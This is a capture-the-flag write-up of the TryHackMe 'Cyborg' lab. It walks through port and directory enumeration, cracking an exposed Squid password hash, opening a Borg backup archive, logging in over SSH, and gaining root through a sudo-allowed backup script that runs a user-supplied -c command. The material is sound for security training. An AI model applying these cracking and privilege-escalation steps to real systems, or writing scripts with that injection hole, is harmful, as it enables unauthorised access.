# Cyborg room - Try Hack Me

This writeup is for the cyborg room at tryhackme.com. Direct link to the room is: https://tryhackme.com/room/cyborgt8

The description of the rooms says *A box involving encrypted archives, source code analysis and more* - so not much of a backstory. 

As always I add the ip to my host file first:
```
 echo "10.10.163.193 cyborg.thm"|sudo tee -a /etc/hosts
```

# Enumeration

The usual nmap scan to begin with:
```
nmap -p- -sCV -T4  cyborg.thm 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-25 03:02 EST
Nmap scan report for 10.10.163.193
Host is up (0.065s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.39 seconds
```
This answers the two 3 first questions about number of ports, and what services runs on the ports.

Let't take a look at the webservice as we have no user names yet for ssh.
The webserver shows the default webpage for a new apache2 installation under Ubuntu linux. Just for the sake of it I checked the page code to look for hidden info - nothing.

Lets fire up gobuster and find some files and directories. 

```
$ gobuster dir -u http://cyborg.thm  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html,zip                                                                                                    130 ⨯
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://cyborg.thm
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,html,zip
[+] Timeout:        10s
===============================================================
2021/01/25 03:14:52 Starting gobuster
===============================================================
/index.html (Status: 200)
/admin (Status: 301)
/etc (Status: 301)
/server-status (Status: 403)
===============================================================
2021/01/25 03:29:23 Finished
===============================================================

```

The scan found a few interesting directories. 

 * /admin - this one shows some website about a mucisian
 * /etc/ - this contains a directory listing containg a folder /etc/squid/ and this one contains a passwd file with a single set of creds

Let's start with the passwd file as it is always nice to get some credentials. 

First I check the hash type with `hashid`(hash scrambled here):

```
$ echo '$apr1$-------------------TTn.'|hashid                                                                                                                                                                             130 ⨯
Analyzing '$apr1$-------------------TTn.'
[+] MD5(APR) 
[+] Apache MD
```

OK so basically an MD5 hash - a quick job for John the Ripper. 

```
$john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s-------d        (music_archive)
1g 0:00:00:00 DONE (2021-01-25 03:24) 2.040g/s 79542p/s 79542c/s 79542C/s 112806..samantha5
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

The password was found instantly so now we have a user/password set.

The /admin/squid folder also contains a squid.conf file:

```
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```

This hints that the Squid proxy installation is using the specific passwd file and hence the creds we have are for Squid. 

Let's move on to the `/admin` directory - the actual website

![alt text](https://github.com/kimusan/THM-writeups/raw/main/cyborg/cyborg-admin-web-ss.png "admin website")

The menu in the top reveals a few things. There is an option to download the archive which gives us a file archive.tar. 
unpacking this reveals a bunch of folders with a structure like `home/field/dev/final_archive`. Could this hit a user name "field"? 

A readme file tells us that this is a Borg Backup[https://www.borgbackup.org/] file. It contains a bunch of other files - some with hashes and similar - might need to look some more on these.

Back at the website theres also an "Admins" menu item which shows us a chat box conversation between admins.  Final message tell us that the squid install is broken and left "as-is" but the music_archive 
should be safe.  It also mentions 3 names : Josh, Adam, and Alex.

Again I think this is a hint that the archive might have the creds we found earlier. 

Let's take a look at the archive.tar content again - we already know that it is a Borg backup archive so lets see what borg can do now that we have a password that might work:

```
$ borg list home/field/dev/final_archive
Enter passphrase for key /home/kali/Downloads/home/field/dev/final_archive: 
music_archive                        Tue, 2020-12-29 09:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
```

Success! we can list the content - now let's extract the file:

```
$ borg extract home/field/dev/final_archive/::music_archive                                                                                                                                                                         2 ⨯
Enter passphrase for key /home/kali/Downloads/home/field/dev/final_archive: 
```

Ok the files are unpacked and checking the `home/` folder we now see `home/alex` which looks like it ia a full home-dir backup for the user alex. 

Maybe we can find an ssh key or similar here? Lets check. 

No .ssh folder, but a note.txt gives us a new password alex:S-------3 (redacted)

Could this be ssh creds? lets try

```
$ ssh alex@cyborg.thm                     
alex@cyborg.thm's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


27 packages can be updated.
0 updates are security updates.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

alex@ubuntu:~$ ls
```

Bingo! we have shell and thereby the user.txt 

## Priveledge escalation

First thing I do when I need to get root is usually to do `sudo -l`. 
```
$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

Ok so we can sudo run the script /etc/mp3backups/backup.sh without password. Lets see if the script can be abused.

```bash
$ cat /etc/mp3backups/backup.sh 
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt


input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
  #a="/etc/mp3backups/backed_up_files.txt"
#  b=$(basename $input)
  #echo
#  echo "$line"
#done < "$input"

while getopts c: flag
do
        case "${flag}" in 
                c) command=${OPTARG};;
        esac
done



backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cmd

```

One interesting thing that instantly pops up is the last two lines. It runs whatever is in $command and puts the output in $cmd. The output is printed when done. 

The content in $command comes from a command line argument -c so basically we can run any command as root with this. We could execute bash but as all output is collected into $cmd we can just as well just go streight for the root.txt flag.

```
$ sudo /etc/mp3backups/backup.sh -c "cat /root/root.txt"
/home/alex/Music/image12.mp3
/home/alex/Music/image7.mp3
/home/alex/Music/image1.mp3
/home/alex/Music/image10.mp3
/home/alex/Music/image5.mp3
/home/alex/Music/image4.mp3
/home/alex/Music/image3.mp3
/home/alex/Music/image6.mp3
/home/alex/Music/image8.mp3
/home/alex/Music/image9.mp3
/home/alex/Music/image11.mp3
/home/alex/Music/image2.mp3
find: ‘/run/user/108/gvfs’: Permission denied
Backing up /home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3 to /etc/mp3backups//ubuntu-scheduled.tgz

tar: Removing leading `/' from member names
tar: /home/alex/Music/song1.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song2.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song3.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song4.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song5.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song6.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song7.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song8.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song9.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song10.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song11.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song12.mp3: Cannot stat: No such file or directory
tar: Exiting with failure status due to previous errors

Backup finished
flag{T---------------------------------d} (redacted)
```

And thats the end of this room. 

## Final thoughts

This was classified as an easy room and I am sure it will be fun for beginners. The clues/passwords are placed quite obvious so besides a few places where they try to send you down a rabbithole (e.g. some rsync commands in the .bash_history file) there is a pretty red line through the room. 


